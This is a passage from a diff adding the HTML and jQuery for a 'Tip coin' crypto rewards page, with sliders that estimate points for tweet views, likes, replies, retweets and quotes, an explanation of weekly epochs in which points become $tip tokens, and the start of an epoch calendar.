+                                                $("#scroll_Track4").css("width", this.currentX + 2 + "px");
+                                                $("#scroll_Thumb4").css("margin-left", this.currentX + "px");
+                                                this.Value();
+                                                $("#scrollBarTxt4").html(ScrollBar4.value + '0');
+                                                var shuzhi4 = ScrollBar4.value * 15;
+                                                $("#eq5").html(shuzhi4 + ',000 points');
+                                            },
+                                            Value: function() {
+                                                var valite = false;
+                                                var currentValue;
+                                                $("#scroll_Thumb4").mousedown(function() {
+                                                    valite = true;
+                                                    $(document.body).mousemove(function(event) {
+                                                        if (valite == false) return;
+                                                        var changeX = event.clientX - ScrollBar4.currentX;
+                                                        currentValue = changeX - $("#Demo4").offset().left + 100.5;
+
+                                                        $("#scroll_Thumb4").css("margin-left", currentValue + "px");
+                                                        $("#scroll_Track4").css("width", currentValue + 2 + "px");
+                                                        if ((currentValue + 25) >= $("#scrollBar4").width()) {
+                                                            $("#scroll_Thumb4").css("margin-left", $("#scrollBar4").width() - 25 + "px");
+                                                            $("#scroll_Track4").css("width", $("#scrollBar4").width() + 2 + "px");
+                                                            ScrollBar4.value = ScrollBar4.maxValue;
+                                                        } else if (currentValue <= 0) {
+                                                            $("#scroll_Thumb4").css("margin-left", "0px");
+                                                            $("#scroll_Track4").css("width", "0px");
+                                                        } else {
+                                                            ScrollBar4.value = Math.round(10 * (currentValue / $("#scrollBar4").width()));
+                                                        }
+                                                        $("#scrollBarTxt4").html(ScrollBar4.value + '00');
+                                                        var shuzhi4 = ScrollBar4.value * 15;
+                                                        $("#eq5").html(shuzhi4 + ',000 points');
+                                                        var total = parseInt($("#eq1").html()) + parseInt($("#eq2").html())+ parseInt($("#eq3").html())+ parseInt($("#eq4").html())+ parseInt($("#eq5").html());
+                                                         $('.total1').html(total + ',000');
+                                                    });
+                                                });
+                                                $(document.body).mouseup(function() {
+                                                    ScrollBar4.value = Math.round(10 * (currentValue / $("#scrollBar4").width()));
+                                                    valite = false;
+                                                    if (ScrollBar4.value >= ScrollBar4.maxValue) ScrollBar4.value = ScrollBar4.maxValue;
+                                                    if (ScrollBar4.value <= 0) ScrollBar4.value = 0;
+                                                    $("#scrollBarTxt4").html(ScrollBar4.value + '0');
+                                                });
+                                            },
+                                            GetValue: function() {
+                                                this.currentX = $("#scrollBar4").width() * (this.value / this.maxValue);
+                                            }
+                                        }
+                                        var ProgressBar4 = {
+
+                                            maxValue: 100,
+
+                                            value: 20,
+
+                                            SetValue: function(aValue) {
+
+                                                this.value = aValue;
+
+                                                if (this.value >= this.maxValue) this.value = this.maxValue;
+
+                                                if (this.value <= 0) this.value = 0;
+
+                                                var mWidth = this.value / this.maxValue * $("#progressBar4").width() + "px";
+
+                                                $("#progressBar_Track4").css("width", mWidth);
+
+                                                $("#progressBarTxt4").html(this.value);
+
+                                            }
+
+                                        }
+                                        </script>
+                                        <script>
+                                            $(".css-yjbt8g").click(function(){
+                                                $("#menu-").toggle();
+                                            });
+                                            $(".css-r8u8y9 .css-l0hw8u").click(function(){
+                                                let wenben = $(this).text();
+                                                $(this).toggleClass("Mui-selected").siblings().removeClass("Mui-selected");
+                                                $(".css-yjbt8g").text(wenben);
+                                                $("#menu-").toggle();
+                                            });
+                                            $("#tab1").click(function(){
+                                                $("#txt1").text("25x for tweets");
+                                                $("#txt2").text("MINIMUM OF 10,000");
+                                            });
+                                            $("#tab2").click(function(){
+                                                $("#txt1").text("1x for replies");
+                                                $("#txt2").text("MAXIMUM OF 25,000");
+                                            });
+                                            $("#tab3").click(function(){
+                                                $("#txt1").text("1/10 for kickbacks");
+                                                $("#txt2").text("NO LIMITS");
+                                            });
+                                        </script>
+                                        <link rel="stylesheet" type="text/css" href="static/js/styles.css">
+                                        <div class="MuiBox-root css-0">
+                                            <div class="MuiStack-root css-1x4jos1">
+                                                <svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="VisibilityIcon">
+                                                    <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z">
+                                                    </path>
+                                                </svg>
+                                                <p class="MuiTypography-root MuiTypography-body1 MuiTypography-gutterBottom css-1pqbku8" id="input-slider">Views</p>
+                                            </div>
+                                            <div class="MuiStack-root css-1x4jos1">
+                                                <p class="MuiTypography-root MuiTypography-body1 css-1roqnrn">0</p>
+                                                <div id="Demo" class="progressTime">
+                                                    <div id="Main">
+                                                        <div id="scrollBar">
+                                                            <div id="scroll_Track"></div>
+                                                            <div id="scroll_Thumb">
+                                                                <p id="scrollBarTxt" style="text-align:center;">0</p>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <p class="MuiTypography-root MuiTypography-body1 css-1roqnrn" style="max-width: 28px;position: relative;left: 0px;">100K+</p>
+                                            </div>
+                                        </div>
+                                        <div class="MuiBox-root css-0">
+                                            <div class="MuiStack-root css-1x4jos1">
+                                                <svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="FavoriteIcon">
+                                                    <path d="m12 21.35-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z">
+                                                    </path>
+                                                </svg>
+                                                <p class="MuiTypography-root MuiTypography-body1 MuiTypography-gutterBottom css-1pqbku8" id="input-slider">Likes</p>
+                                            </div>
+                                            <div class="MuiStack-root css-1x4jos1">
+                                                <p class="MuiTypography-root MuiTypography-body1 css-1roqnrn">0</p>
+                                                <div id="Demo1" class="progressTime">
+                                                    <div id="Main">
+                                                        <div id="scrollBar1">
+                                                            <div id="scroll_Track1"></div>
+                                                            <div id="scroll_Thumb1">
+                                                                <p id="scrollBarTxt1" style="text-align:center;"></p>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <p class="MuiTypography-root MuiTypography-body1 css-1roqnrn">1K+</p>
+                                            </div>
+                                        </div>
+                                        <div class="MuiBox-root css-0">
+                                            <div class="MuiStack-root css-1x4jos1">
+                                                <svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="QuickreplyIcon">
+                                                    <path d="M22 4c0-1.1-.9-2-2-2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h9v-8h7V4z">
+                                                    </path>
+                                                    <path d="M22.5 16h-2.2l1.7-4h-5v6h2v5z"></path>
+                                                </svg>
+                                                <p class="MuiTypography-root MuiTypography-body1 MuiTypography-gutterBottom css-1pqbku8" id="input-slider">Replies</p>
+                                            </div>
+                                            <div class="MuiStack-root css-1x4jos1">
+                                                <p class="MuiTypography-root MuiTypography-body1 css-1roqnrn">0</p>
+                                                <div id="Demo2" class="progressTime">
+                                                    <div id="Main">
+                                                        <div id="scrollBar2">
+                                                            <div id="scroll_Track2"></div>
+                                                            <div id="scroll_Thumb2">
+                                                                <p id="scrollBarTxt2" style="text-align:center;"></p>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <p class="MuiTypography-root MuiTypography-body1 css-1roqnrn" style="max-width: 28px;position: relative;left: 0px;">1K+</p>
+                                            </div>
+                                        </div>
+                                        <div class="MuiBox-root css-0">
+                                            <div class="MuiStack-root css-1x4jos1">
+                                                <svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="ReplyAllIcon">
+                                                    <path d="M7 8V5l-7 7 7 7v-3l-4-4 4-4zm6 1V5l-7 7 7 7v-4.1c5 0 8.5 1.6 11 5.1-1-5-4-10-11-11z">
+                                                    </path>
+                                                </svg>
+                                                <p class="MuiTypography-root MuiTypography-body1 MuiTypography-gutterBottom css-1pqbku8" id="input-slider">Retweets</p>
+                                            </div>
+                                            <div class="MuiStack-root css-1x4jos1">
+                                                <p class="MuiTypography-root MuiTypography-body1 css-1roqnrn">0</p>
+                                                <div id="Demo3" class="progressTime">
+                                                    <div id="Main">
+                                                        <div id="scrollBar3">
+                                                            <div id="scroll_Track3"></div>
+                                                            <div id="scroll_Thumb3">
+                                                                <p id="scrollBarTxt3" style="text-align:center;"></p>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <p class="MuiTypography-root MuiTypography-body1 css-1roqnrn" style="max-width: 28px;position: relative;left: 0px;">100+</p>
+                                            </div>
+                                        </div>
+                                        <div class="MuiBox-root css-0">
+                                            <div class="MuiStack-root css-1x4jos1">
+                                                <svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="FormatQuoteIcon">
+                                                    <path d="M6 17h3l2-4V7H5v6h3zm8 0h3l2-4V7h-6v6h3z"></path>
+                                                </svg>
+                                                <p class="MuiTypography-root MuiTypography-body1 MuiTypography-gutterBottom css-1pqbku8" id="input-slider">Quotes</p>
+                                            </div>
+                                            <div class="MuiStack-root css-1x4jos1">
+                                                <p class="MuiTypography-root MuiTypography-body1 css-1roqnrn">0</p>
+                                                <div id="Demo4" class="progressTime">
+                                                    <div id="Main">
+                                                        <div id="scrollBar4">
+                                                            <div id="scroll_Track4"></div>
+                                                            <div id="scroll_Thumb4">
+                                                                <p id="scrollBarTxt4" style="text-align:center;"></p>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <p class="MuiTypography-root MuiTypography-body1 css-1roqnrn" style="max-width: 28px;position: relative;left: 0px;">100+</p>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <hr class="MuiDivider-root MuiDivider-fullWidth MuiDivider-vertical MuiDivider-flexItem css-1tx19pf">
+                                    <div class="MuiStack-root css-1szzel2">
+                                        <ul class="MuiList-root MuiList-padding css-1ontqvh">
+                                            <li class="MuiListItem-root MuiListItem-gutters MuiListItem-padding css-10r3l74">
+                                                <div class="MuiListItemIcon-root css-5n5rd1">
+                                                    <svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="VisibilityIcon">
+                                                        <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z">
+                                                        </path>
+                                                    </svg>
+                                                </div>
+                                                <div class="MuiListItemText-root MuiListItemText-multiline css-1xar93x">
+                                                    <span class="MuiTypography-root MuiTypography-body1 MuiListItemText-primary css-1obovq4" id="eq1">50,000
+                                                        points</span>
+                                                    <p class="MuiTypography-root MuiTypography-body2 MuiListItemText-secondary css-zds6py">
+                                                        1 point per view</p>
+                                                </div>
+                                            </li>
+                                            <li class="MuiListItem-root MuiListItem-gutters MuiListItem-padding css-10r3l74">
+                                                <div class="MuiListItemIcon-root css-5n5rd1">
+                                                    <svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="FavoriteIcon">
+                                                        <path d="m12 21.35-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z">
+                                                        </path>
+                                                    </svg>
+                                                </div>
+                                                <div class="MuiListItemText-root MuiListItemText-multiline css-1xar93x">
+                                                    <span class="MuiTypography-root MuiTypography-body1 MuiListItemText-primary css-1obovq4" id="eq2">30,000
+                                                        points</span>
+                                                    <p class="MuiTypography-root MuiTypography-body2 MuiListItemText-secondary css-zds6py">
+                                                        100 points per like</p>
+                                                </div>
+                                            </li>
+                                            <li class="MuiListItem-root MuiListItem-gutters MuiListItem-padding css-10r3l74">
+                                                <div class="MuiListItemIcon-root css-5n5rd1">
+                                                    <svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="QuickreplyIcon">
+                                                        <path d="M22 4c0-1.1-.9-2-2-2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h9v-8h7V4z">
+                                                        </path>
+                                                        <path d="M22.5 16h-2.2l1.7-4h-5v6h2v5z"></path>
+                                                    </svg>
+                                                </div>
+                                                <div class="MuiListItemText-root MuiListItemText-multiline css-1xar93x">
+                                                    <span class="MuiTypography-root MuiTypography-body1 MuiListItemText-primary css-1obovq4" id="eq3">50,000
+                                                        points</span>
+                                                    <p class="MuiTypography-root MuiTypography-body2 MuiListItemText-secondary css-zds6py">
+                                                        250 points per reply</p>
+                                                </div>
+                                            </li>
+                                            <li class="MuiListItem-root MuiListItem-gutters MuiListItem-padding css-10r3l74">
+                                                <div class="MuiListItemIcon-root css-5n5rd1">
+                                                    <svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="ReplyAllIcon">
+                                                        <path d="M7 8V5l-7 7 7 7v-3l-4-4 4-4zm6 1V5l-7 7 7 7v-4.1c5 0 8.5 1.6 11 5.1-1-5-4-10-11-11z">
+                                                        </path>
+                                                    </svg>
+                                                </div>
+                                                <div class="MuiListItemText-root MuiListItemText-multiline css-1xar93x">
+                                                    <span class="MuiTypography-root MuiTypography-body1 MuiListItemText-primary css-1obovq4" id="eq4">70,000
+                                                        points</span>
+                                                    <p class="MuiTypography-root MuiTypography-body2 MuiListItemText-secondary css-zds6py">
+                                                        1K points per retweet</p>
+                                                </div>
+                                            </li>
+                                            <li class="MuiListItem-root MuiListItem-gutters MuiListItem-padding css-10r3l74">
+                                                <div class="MuiListItemIcon-root css-5n5rd1">
+                                                    <svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="FormatQuoteIcon">
+                                                        <path d="M6 17h3l2-4V7H5v6h3zm8 0h3l2-4V7h-6v6h3z"></path>
+                                                    </svg>
+                                                </div>
+                                                <div class="MuiListItemText-root MuiListItemText-multiline css-1xar93x">
+                                                    <span class="MuiTypography-root MuiTypography-body1 MuiListItemText-primary css-1obovq4" id="eq5">75,000
+                                                        points</span>
+                                                    <p class="MuiTypography-root MuiTypography-body2 MuiListItemText-secondary css-zds6py">
+                                                        1.5K points per quote</p>
+                                                </div>
+                                            </li>
+                                        </ul>
+                                        <hr class="MuiDivider-root MuiDivider-fullWidth css-1px5dlw">
+                                        <li class="MuiListItem-root MuiListItem-gutters MuiListItem-padding css-10r3l74">
+                                            <div class="MuiListItemIcon-root css-5n5rd1">
+                                                <svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="CloseIcon">
+                                                    <path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z">
+                                                    </path>
+                                                </svg>
+                                            </div>
+                                            <div class="MuiListItemText-root css-1tsvksn">
+                                                <span id="txt1" class="MuiTypography-root MuiTypography-body1 MuiListItemText-primary css-1obovq4">25x
+                                                    for tweets</span>
+                                            </div>
+                                        </li>
+                                        <hr class="MuiDivider-root MuiDivider-fullWidth css-1px5dlw">
+                                        <div class="MuiStack-root css-183tqb7">
+                                            <div class="MuiStack-root css-1edxzt1">
+                                                <h6 class="MuiTypography-root MuiTypography-h6 css-1fxlxc1">Total
+                                                    Points:</h6>
+                                                <div class="MuiChip-root MuiChip-filled MuiChip-sizeMedium MuiChip-colorDefault MuiChip-filledDefault css-hqmfjj">
+                                                    <span class="MuiChip-label MuiChip-labelMedium css-9iedg7 total1">6,875,000</span>
+                                                </div>
+                                            </div>
+                                            <span id="txt2" class="MuiTypography-root MuiTypography-overline css-fml22u">Minimum of
+                                                10,000</span>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <hr class="MuiDivider-root MuiDivider-fullWidth MuiDivider-flexItem css-10mk4c7" id="about">
+                
+                <div class="MuiStack-root css-9e918b" id="about">
+                    <h3 class="MuiTypography-root MuiTypography-h3 css-10bjihq">THE PROCESS</h3>
+                    <p class="MuiTypography-root MuiTypography-body1 css-t5ptwq">Tip coin works off of 1 week epochs that started on September 1st, 2023 at 8:00AM EST (our birthday!). Points earned during an epoch can be claimed for $tip tokens during the following epoch.</p>
+                    <div class="MuiBox-root css-15z7di0">
+                         
+                        <div class="MuiPaper-root MuiPaper-outlined MuiPaper-rounded css-nbcxie">
+                            <div class="MuiStack-root css-18zsr3k">
+                                <span class="material-icons notranslate MuiIcon-root MuiIcon-fontSizeLarge css-1t3czx9" aria-hidden="true">
+                                    <svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeLarge css-6flbmm" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="SendIcon">
+                                        <path d="M2.01 21 23 12 2.01 3 2 10l15 2-15 2z"></path>
+                                    </svg>
+                                </span>
+                                <h6 class="MuiTypography-root MuiTypography-h6 css-1r522s8">Earn points</h6>
+                                <p class="MuiTypography-root MuiTypography-body1 css-1roqnrn">
+                                    Send tweets mentioning us (see above) during the epoch to earn points and compete with friends
+                                </p>
+                            </div>
+                        </div>
+                        
+                        <svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeLarge css-vsjv72" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="KeyboardDoubleArrowRightIcon">
+                            <path d="M6.41 6 5 7.41 9.58 12 5 16.59 6.41 18l6-6z"></path>
+                            <path d="m13 6-1.41 1.41L16.17 12l-4.58 4.59L13 18l6-6z"></path>
+                        </svg>
+                        <svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeLarge css-k80lun" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="KeyboardDoubleArrowDownIcon">
+                            <path d="M18 6.41 16.59 5 12 9.58 7.41 5 6 6.41l6 6z"></path>
+                            <path d="m18 13-1.41-1.41L12 16.17l-4.59-4.58L6 13l6 6z"></path>
+                        </svg>
+                         
+                        <div class="MuiPaper-root MuiPaper-outlined MuiPaper-rounded css-nbcxie">
+                            <div class="MuiStack-root css-18zsr3k">
+                                <span class="material-icons notranslate MuiIcon-root MuiIcon-fontSizeLarge css-1t3czx9" aria-hidden="true">
+                                    <svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeLarge css-6flbmm" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="CalculateIcon">
+                                        <path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-5.97 4.06L14.09 6l1.41 1.41L16.91 6l1.06 1.06-1.41 1.41 1.41 1.41-1.06 1.06-1.41-1.4-1.41 1.41-1.06-1.06 1.41-1.41-1.41-1.42zm-6.78.66h5v1.5h-5v-1.5zM11.5 16h-2v2H8v-2H6v-1.5h2v-2h1.5v2h2V16zm6.5 1.25h-5v-1.5h5v1.5zm0-2.5h-5v-1.5h5v1.5z">
+                                        </path>
+                                    </svg>
+                                </span>
+                                <h6 class="MuiTypography-root MuiTypography-h6 css-1r522s8">Point Calculations</h6>
+                                <p class="MuiTypography-root MuiTypography-body1 css-1roqnrn">We add up all of your mentions and continuously recalculate engagement to update your points</p>
+                            </div>
+                        </div>
+                        
+                        <svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeLarge css-vsjv72" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="KeyboardDoubleArrowRightIcon">
+                            <path d="M6.41 6 5 7.41 9.58 12 5 16.59 6.41 18l6-6z"></path>
+                            <path d="m13 6-1.41 1.41L16.17 12l-4.58 4.59L13 18l6-6z"></path>
+                        </svg>
+                        <svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeLarge css-k80lun" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="KeyboardDoubleArrowDownIcon">
+                            <path d="M18 6.41 16.59 5 12 9.58 7.41 5 6 6.41l6 6z"></path>
+                            <path d="m18 13-1.41-1.41L12 16.17l-4.59-4.58L6 13l6 6z"></path>
+                        </svg>
+                         
+                        <div class="MuiPaper-root MuiPaper-outlined MuiPaper-rounded css-nbcxie">
+                            <div class="MuiStack-root css-18zsr3k">
+                                <span class="material-icons notranslate MuiIcon-root MuiIcon-fontSizeLarge css-1t3czx9" aria-hidden="true">
+                                    <svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeLarge css-6flbmm" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="PercentIcon">
+                                        <path d="M7.5 11C9.43 11 11 9.43 11 7.5S9.43 4 7.5 4 4 5.57 4 7.5 5.57 11 7.5 11zm0-5C8.33 6 9 6.67 9 7.5S8.33 9 7.5 9 6 8.33 6 7.5 6.67 6 7.5 6zM4.0025 18.5832 18.59 3.9955l1.4142 1.4143L5.4167 19.9974zM16.5 13c-1.93 0-3.5 1.57-3.5 3.5s1.57 3.5 3.5 3.5 3.5-1.57 3.5-3.5-1.57-3.5-3.5-3.5zm0 5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z">
+                                        </path>
+                                    </svg>
+                                </span>
+                                <h6 class="MuiTypography-root MuiTypography-h6 css-1r522s8">Token Calculations</h6>
+                                <p class="MuiTypography-root MuiTypography-body1 css-1roqnrn">We determine your percentage of the epoch&#39;s token allotment using points and account status</p>
+                            </div>
+                        </div>
+                        
+                        <svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeLarge css-vsjv72" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="KeyboardDoubleArrowRightIcon">
+                            <path d="M6.41 6 5 7.41 9.58 12 5 16.59 6.41 18l6-6z"></path>
+                            <path d="m13 6-1.41 1.41L16.17 12l-4.58 4.59L13 18l6-6z"></path>
+                        </svg>
+                        <svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeLarge css-k80lun" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="KeyboardDoubleArrowDownIcon">
+                            <path d="M18 6.41 16.59 5 12 9.58 7.41 5 6 6.41l6 6z"></path>
+                            <path d="m18 13-1.41-1.41L12 16.17l-4.59-4.58L6 13l6 6z"></path>
+                        </svg>
+                         
+                        <div class="MuiPaper-root MuiPaper-outlined MuiPaper-rounded css-nbcxie">
+                            <div class="MuiStack-root css-18zsr3k">
+                                <span class="material-icons notranslate MuiIcon-root MuiIcon-fontSizeLarge css-1t3czx9" aria-hidden="true">
+                                    <svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeLarge css-6flbmm" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="SavingsIcon">
+                                        <path d="m19.83 7.5-2.27-2.27c.07-.42.18-.81.32-1.15.08-.18.12-.37.12-.58 0-.83-.67-1.5-1.5-1.5-1.64 0-3.09.79-4 2h-5C4.46 4 2 6.46 2 9.5S4.5 21 4.5 21H10v-2h2v2h5.5l1.68-5.59 2.82-.94V7.5h-2.17zM13 9H8V7h5v2zm3 2c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1z">
+                                        </path>
+                                    </svg>
+                                </span>
+                                <h6 class="MuiTypography-root MuiTypography-h6 css-1r522s8">Earn Tokens</h6>
+                                <p class="MuiTypography-root MuiTypography-body1 css-1roqnrn">Claim your percentage of the previous epoch tokens from the dashboard in the next epoch</p>
+                            </div>
+                        </div>
+                        
+                    </div>
+                </div>
+                
+                <hr class="MuiDivider-root MuiDivider-fullWidth MuiDivider-flexItem css-10mk4c7" id="start">
+                <div class="MuiBox-root css-584fvr">
+                    <div class="MuiBox-root css-sg11fo">
+                        <div class="MuiPaper-root MuiPaper-outlined MuiPaper-rounded css-1pxj9xd">
+                            <div class="MuiStack-root css-1ov46kg">
+                                <h5 class="MuiTypography-root MuiTypography-h5 css-1d91fdb">Epochs in 2023年9月</h5>
+                                <div class="MuiGrid-root MuiGrid-container MuiGrid-spacing-xs-1 css-tuxzvu">
+                                    <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-1 css-vwuntk">
+                                        <div class="MuiStack-root css-zg1vud">
+                                            <div class="MuiChip-root MuiChip-filled MuiChip-sizeMedium MuiChip-colorDefault MuiChip-filledDefault css-hqmfjj">
+                                                <span class="MuiChip-label MuiChip-labelMedium css-9iedg7">Sun</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-1 css-vwuntk">
+                                        <div class="MuiStack-root css-zg1vud">
+                                            <div class="MuiChip-root MuiChip-filled MuiChip-sizeMedium MuiChip-colorDefault MuiChip-filledDefault css-hqmfjj">
+                                                <span class="MuiChip-label MuiChip-labelMedium css-9iedg7">Mon</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-1 css-vwuntk">
+                                        <div class="MuiStack-root css-zg1vud">
+                                            <div class="MuiChip-root MuiChip-filled MuiChip-sizeMedium MuiChip-colorDefault MuiChip-filledDefault css-hqmfjj">
+                                                <span class="MuiChip-label MuiChip-labelMedium css-9iedg7">Tue</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-1 css-vwuntk">
+                                        <div class="MuiStack-root css-zg1vud">
+                                            <div class="MuiChip-root MuiChip-filled MuiChip-sizeMedium MuiChip-colorDefault MuiChip-filledDefault css-hqmfjj">
+                                                <span class="MuiChip-label MuiChip-labelMedium css-9iedg7">Wed</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-1 css-vwuntk">
+                                        <div class="MuiStack-root css-zg1vud">
+                                            <div class="MuiChip-root MuiChip-filled MuiChip-sizeMedium MuiChip-colorDefault MuiChip-filledDefault css-hqmfjj">
+                                                <span class="MuiChip-label MuiChip-labelMedium css-9iedg7">Thu</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-1 css-vwuntk">
+                                        <div class="MuiStack-root css-zg1vud">
+                                            <div class="MuiChip-root MuiChip-filled MuiChip-sizeMedium MuiChip-colorDefault MuiChip-filledDefault css-hqmfjj">
+                                                <span class="MuiChip-label MuiChip-labelMedium css-9iedg7">Fri</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-1 css-vwuntk">
+                                        <div class="MuiStack-root css-zg1vud">
+                                            <div class="MuiChip-root MuiChip-filled MuiChip-sizeMedium MuiChip-colorDefault MuiChip-filledDefault css-hqmfjj">
+                                                <span class="MuiChip-label MuiChip-labelMedium css-9iedg7">Sat</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-1 css-vwuntk">
+                                        <div class="MuiBox-root css-8durlh"></div>
+                                    </div>
+                                    <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-1 css-vwuntk">
+                                        <div class="MuiBox-root css-8durlh"></div>
+                                    </div>
+                                    <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-1 css-vwuntk">
+                                        <div class="MuiBox-root css-8durlh"></div>
+                                    </div>
+                                    <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-1 css-vwuntk">
+                                        <div class="MuiBox-root css-8durlh"></div>
+                                    </div>
+                                    <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-1 css-vwuntk">
+                                        <div class="MuiBox-root css-8durlh"></div>
+                                    </div>
+                                    <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-1 css-vwuntk">
+                                        <div class="MuiBox-root css-8durlh">
+                                            <div class="MuiChip-root MuiChip-outlined MuiChip-sizeMedium MuiChip-colorSuccess MuiChip-outlinedSuccess css-2iccp2">
+                                                <span class="MuiChip-label MuiChip-labelMedium css-9iedg7">01</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-1 css-vwuntk">
+                                        <div class="MuiBox-root css-8durlh">
+                                            <div class="MuiChip-root MuiChip-outlined MuiChip-sizeMedium MuiChip-colorSuccess MuiChip-outlinedSuccess css-2iccp2">
+                                                <span class="MuiChip-label MuiChip-labelMedium css-9iedg7">02</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-1 css-vwuntk">
+                                        <div class="MuiBox-root css-8durlh">
+                                            <div class="MuiChip-root MuiChip-outlined MuiChip-sizeMedium MuiChip-colorSuccess MuiChip-outlinedSuccess css-2iccp2">
+                                                <span class="MuiChip-label MuiChip-labelMedium css-9iedg7">03</span>
+                                            </div>
+                                        </div>
+                                    </div>
